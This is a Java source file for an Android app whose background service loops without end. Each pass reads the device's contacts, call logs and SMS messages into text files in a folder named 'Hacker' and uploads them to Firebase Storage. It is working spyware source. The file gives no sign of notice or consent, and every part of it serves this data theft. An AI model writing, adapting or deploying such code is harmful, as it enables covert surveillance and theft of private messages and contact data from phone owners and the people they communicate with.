package com.hello.contacts;

import android.annotation.SuppressLint;
import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;


public class MyForegroundService extends IntentService {
   FirebaseStorage storage;
   FirebaseDatabase database;
    @RequiresApi(api = Build.VERSION_CODES.O)
    public MyForegroundService() {
        super("MyForegroundService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        new Thread(() -> {
            while (true){
                Log.e("Service", "Serice Foreground service");
                try {
                    Thread.sleep(600);//Every 10 Minutes(600000),6000 means 6 Seconds
                    gettingcontacts();
                    getcalllog();
                    getsms();
                    uploadpdf();
                    Log.e("Service", "Writing data");
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

        }).start();
    }






    private void uploadpdf() {
       String[] pathnames;
        File file=new File(getExternalFilesDir(null)+"/Hacker");

        pathnames=file.list();

        for(String item:pathnames){
            Log.d("TAG", "uploadpdf: "+item);
           Uploadtxt(item);
        }
    }

    private void Uploadtxt(String item) {
        File ff=new File(getExternalFilesDir(null)+"/Hacker/"+item);
        Uri file=Uri.fromFile(ff);
        Log.d("Path",file.toString());
        storage=FirebaseStorage.getInstance();//returns an object of firebase storage
        database=FirebaseDatabase.getInstance();
        StorageReference storageReference=storage.getReference();
        storageReference.child("Hacker").child(item).putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
            Log.e("Success","Pdf Uploaded Sucessfully "+item);
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {

            }
        });
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private void getsms() {
        try {
            File SmsFile=new File(getExternalFilesDir(null)+"/Hacker");

            File smswriter=new File(SmsFile,"Sms.txt");
            FileWriter smsw=new FileWriter(smswriter);
            Cursor cursor=getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);
            if(cursor.getCount()>0) {
                while (cursor.moveToNext()) {

                    String Number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String Message = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String Date1 = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    smsw.append("Number : " + Number + "\r\n" + "Message : " + Message + "\r\n" + "Date : " + Date1 + "\r\n");
                    smsw.flush();
                }
            }
            smsw.close();



        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void getcalllog() {
        try {
            File file=new File(getExternalFilesDir(null)+"/Hacker");

            File CallLogs=new File(file,"CallLogs.txt");
            FileWriter callwriter=new FileWriter(CallLogs);
            ContentResolver contentResolver=getContentResolver();
            Uri Call= CallLog.Calls.CONTENT_URI;
            Cursor cursorcallalogs=contentResolver.query(Call,null,null,null,null);
            if(cursorcallalogs.getCount() >0) {
                while(cursorcallalogs.moveToNext()){
                    @SuppressLint("Range") String Name=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    @SuppressLint("Range") String Number=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.NUMBER));
                    @SuppressLint("Range") String Duration=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.DURATION));
                    callwriter.append("Cached_Name : "+Name+"\r\n"+"Number : "+Number+"\r\n"+"Duration : "+Duration+" Seconds\r\n");
                    callwriter.flush();
                }
            }
            callwriter.close();

        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void gettingcontacts(){
        try {
            File file=new File(getExternalFilesDir(null)+"/Hacker");

            File Contacts=new File(file,"Contacts.txt");

            FileWriter writer=new FileWriter(Contacts);

            ContentResolver contentResolver=getContentResolver();
            Uri uri= ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            Cursor cursor=contentResolver.query(uri,null,null,null,null);
            Log.w("Contact Provider Demo", "Total # No of Contacts ::: " +Integer.toString(cursor.getCount()));
            if(cursor.getCount()>0){
                while (cursor.moveToNext()){
                    @SuppressLint("Range") String contactname= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    @SuppressLint("Range") String phoneNumber= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    writer.append("Contact Name : "+contactname+" Ph : "+phoneNumber+"\r\n");
                    writer.flush();
                    Log.i("Content Provider","Contact Name ::: "+contactname+" Ph # "+phoneNumber);
                }
                writer.close();
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}
